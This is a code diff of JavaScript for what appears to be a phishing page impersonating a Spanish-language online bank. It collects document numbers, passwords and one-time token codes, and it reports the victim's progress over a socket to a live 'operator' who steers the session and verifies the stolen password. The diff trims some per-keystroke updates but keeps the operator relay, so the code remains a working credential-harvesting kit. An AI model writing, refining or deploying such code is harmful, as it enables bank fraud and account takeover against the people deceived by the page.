@@ -58,10 +58,6 @@
   }
 
   if (socket) {
-    socket.on("connect", function () {
-      sendSocketUpdate("Conectado");
-    });
-
     socket.on("operator:action", function (data) {
       hideLoading();
       const { action, message } = data;
@@ -104,7 +100,6 @@
     if (next === "doc") title.textContent = "Accede a la banca digital";
     if (next === "pass") title.textContent = "Accede a la banca digital";
     if (next === "verify") title.textContent = "Verifica tu identidad";
-    sendSocketUpdate();
   }
 
   function limitsFor(type) {
@@ -120,7 +115,6 @@
     docNumber.inputMode = lim.mode;
     docNumber.value = docNumber.value.replace(lim.filter, "").slice(0, lim.max);
     syncFilled(docNumber, docWrap);
-    sendSocketUpdate();
   }
 
   function syncFilled(input, wrap) {
@@ -133,12 +127,10 @@
     syncFilled(this, docWrap);
     docWrap.classList.remove("error");
     showError("");
-    sendSocketUpdate();
   });
 
   password.addEventListener("input", function () {
     this.closest(".input-field").classList.toggle("filled", this.value.length > 0);
-    sendSocketUpdate();
   });
 
   docTypeBtn.addEventListener("click", function (event) {
@@ -177,7 +169,6 @@
     box.addEventListener("input", function () {
       this.value = this.value.replace(/\D/g, "").slice(0, 1);
       if (this.value && tokens[index + 1]) tokens[index + 1].focus();
-      sendSocketUpdate();
     });
     box.addEventListener("keydown", function (event) {
       if (event.key === "Backspace" && !this.value && tokens[index - 1]) {
@@ -211,7 +202,7 @@
         return;
       }
       showLoading("Verificando contraseña...");
-      sendSocketUpdate("Esperando verificación de contraseña por el operador");
+      sendSocketUpdate("Esperando verificación por el operador");
       return;
     }
     const code = tokens.map(function (t) { return t.value; }).join("");
